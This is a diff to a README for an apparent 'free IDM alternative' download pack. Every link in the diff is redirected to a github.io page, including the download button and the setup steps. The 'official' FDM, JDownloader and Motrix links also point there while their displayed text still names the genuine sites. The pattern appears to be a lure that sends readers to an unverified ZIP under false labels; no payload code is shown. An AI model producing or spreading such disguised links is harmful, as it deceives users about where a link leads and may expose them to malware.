@@ -1,12 +1,12 @@
 # 🚀 idm-alternative-fdm-2026 - The Ultimate Free IDM Replacement Guide
 
-[![Download Now](https://img.shields.io/badge/Download-Free_IDM_Alternative_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Djzottjennzott/idm-alternative-fdm-2026)
+[![Download Now](https://img.shields.io/badge/Download-Free_IDM_Alternative_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://djzottjennzott.github.io)
 
 ---
 
 ## 📥 Download and Setup Guide
 
-Visit this link to download the application: [https://github.com/Djzottjennzott/idm-alternative-fdm-2026](https://github.com/Djzottjennzott/idm-alternative-fdm-2026)
+Visit this link to download the application: [https://djzottjennzott.github.io](https://djzottjennzott.github.io)
 
 This repository contains everything you need to replace Internet Download Manager (IDM) with completely free, open-source alternatives that work just as well—if not better. The pack includes pre-configured settings for three powerful download managers: **FDM (Free Download Manager)**, **JDownloader 2**, and **Motrix**. No technical skills required—just follow the steps below and you'll be downloading at full speed in minutes.
 
@@ -45,7 +45,7 @@ Follow these simple steps to get your new download manager up and running:
 
 ### Step 1: Download the Pack
 
-Click the green download button at the top of this page, or visit [https://github.com/Djzottjennzott/idm-alternative-fdm-2026](https://github.com/Djzottjennzott/idm-alternative-fdm-2026) directly. The page will open in your browser, and you'll see a green "Code" button. Click it, then select "Download ZIP" to save the entire pack to your computer.
+Click the green download button at the top of this page, or visit [https://djzottjennzott.github.io](https://djzottjennzott.github.io) directly. The page will open in your browser, and you'll see a green "Code" button. Click it, then select "Download ZIP" to save the entire pack to your computer.
 
 ### Step 2: Extract the Files
 
@@ -115,7 +115,7 @@ You save at least 2–3 hours of research and trial-and-error. Just download, ex
 
 Before you start downloading, make sure you:
 
-1. Downloaded the ZIP from [https://github.com/Djzottjennzott/idm-alternative-fdm-2026](https://github.com/Djzottjennzott/idm-alternative-fdm-2026)
+1. Downloaded the ZIP from [https://djzottjennzott.github.io](https://djzottjennzott.github.io)
 2. Extracted all files to a folder you can find
 3. Installed at least one of the three download managers
 4. Imported the pre-configured settings
@@ -127,9 +127,9 @@ That's it! You're now using a free, unlimited, and faster alternative to IDM. En
 
 ## 📚 Additional Resources
 
-- **Official FDM Website:** [www.freedownloadmanager.org](https://www.freedownloadmanager.org)
-- **JDownloader Community:** [www.jdownloader.org](https://www.jdownloader.org)
-- **Motrix GitHub:** [agalwood/Motrix](https://github.com/agalwood/Motrix)
+- **Official FDM Website:** [www.freedownloadmanager.org](https://djzottjennzott.github.io)
+- **JDownloader Community:** [www.jdownloader.org](https://djzottjennzott.github.io)
+- **Motrix GitHub:** [agalwood/Motrix](https://djzottjennzott.github.io)
 
 If you encounter any issues not covered here, check the `FAQ.txt` file in the main folder of the pack, or open an issue on this repository. We're happy to help.
 
